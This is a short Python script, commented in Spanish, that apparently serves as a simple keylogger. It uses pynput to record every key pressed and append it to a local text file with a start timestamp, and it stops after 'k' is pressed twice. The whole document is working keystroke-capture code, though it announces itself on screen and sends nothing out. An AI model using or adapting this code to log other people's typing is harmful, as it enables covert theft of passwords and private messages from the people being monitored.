from pynput.keyboard import  Listener

from datetime import datetime

nombre_archivo = "D:\\Programas\\Programas_Python\\keylogger\\mi_archivo.txt"


# Variable global para indicar si se debe detener la grabación
should_stop_recording = False

# Contador para rastrear la cantidad de veces que se presionó la tecla 'k'
contador_k = 0

# Función para guardar las teclas en un archivo
def guardar_tecla(tecla):
    global contador_k  # Declarar la variable como global

    if hasattr(tecla, 'name'):
        tecla_str = tecla.name
    else:
        tecla_str = str(tecla)

    with open(nombre_archivo, "a") as archivo:
        tecla_str = tecla_str.replace("'", "")
        if tecla_str == "enter":
          archivo.write("\n")  
        elif tecla_str == "space":
          archivo.write(" ") 
        else :
            archivo.write(tecla_str)


        if tecla_str == "k":
            contador_k += 1

            if contador_k == 2:
                global should_stop_recording
                should_stop_recording = True
        else:
            contador_k = 0

# Obtener la fecha y hora actual
fecha_hora_actual = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
with open(nombre_archivo, "a") as archivo:
    archivo.write(f"\n\nInicio del programa: {fecha_hora_actual}\n")

# Crear un objeto Listener
with Listener(on_press=guardar_tecla) as listener:
    # Iniciar la grabación
    print("Iniciando la grabación. Presiona 'k' dos veces para detener.")
    
    try:
        while not should_stop_recording:
            pass

    except KeyboardInterrupt:
        pass
